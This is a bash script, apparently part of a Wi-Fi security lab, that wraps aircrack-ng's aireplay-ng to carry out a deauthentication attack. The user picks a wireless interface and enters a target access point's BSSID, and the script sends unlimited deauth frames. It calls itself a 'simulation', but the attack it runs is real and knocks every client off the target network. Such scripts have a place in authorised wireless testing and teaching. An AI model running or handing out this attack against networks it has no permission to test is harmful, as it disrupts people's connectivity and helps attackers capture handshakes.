#!/bin/bash
# Perform a simulation of a Wi-Fi deauthentication attack using aircrack-ng
# Dependencies:
# - https://github.com/aircrack-ng/aircrack-ng

BOLD="\e[1m"
RED="\e[0;31m"
GREEN="\e[0;32m"
BLUE="\e[0;34m"
YELLOW="\e[0;33m"
NORMAL="\e[0m"

echo -e "${BLUE}${BOLD}*** Wi-Fi Deauthentication Attack Simulation Using Arch Linux ***${NORMAL}"
echo -e "${YELLOW}=== Perform Deauthentication Attack Step 3: Attack ===${NORMAL}\n"

# Three terminal windows are required for the attack, notify the user
echo -e "Three terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
echo -e "1. Display the WAP that will be attacked"
echo -e "2. Capture data from the WAP into a file"
echo -e "${GREEN}${BOLD}3. Perform the deauthentication attack${NORMAL}"
echo -e

# Find the names of the wireless network interface controllers (WNICs)
readarray -t WIFI_INTERFACES < <(iw dev | rg -o 'wlp.*')

# List the names of the found WNICs
echo -e "${BOLD}${#WIFI_INTERFACES[@]}${NORMAL} wireless network interface(s) detected:"
for ((i = 0; i < ${#WIFI_INTERFACES[@]}; i++)); do
  echo -e "$((i + 1)). ${BOLD}${WIFI_INTERFACES[i]}${NORMAL}"
done
echo -e

# Let the user pick a WNIC from the numbered list of WNICs
read -r -p "Select the monitoring interface (1..${#WIFI_INTERFACES[@]}): " INTERFACE_I
# Check that the pick is valid
if ((INTERFACE_I < 1 || INTERFACE_I > ${#WIFI_INTERFACES[@]})); then
  echo -e "${RED}Invalid interface. Please select an interface from the list.${NORMAL}"
  exit 1
fi
INTERFACE_NAME_MONITOR="${WIFI_INTERFACES[${INTERFACE_I} - 1]}"

# Ask user to enter BSSID value of the WAP they wish to attack
read -rp "Enter BSSID of WAP to attack (MAC Address, e.g. AA:BB:CC:11:22:33): " BSSID
echo -e

# Perform the deauthentication attack by deauthenticating clients from a WAP
echo -e "Performing deauthentication attack on WAP ${BOLD}${BSSID}${NORMAL} using interface ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
read -n 1 -s -r -p "Press any key to continue..."
echo -e
sudo aireplay-ng --deauth 0 -a "${BSSID}" "${INTERFACE_NAME_MONITOR}"

echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}.${NORMAL}"
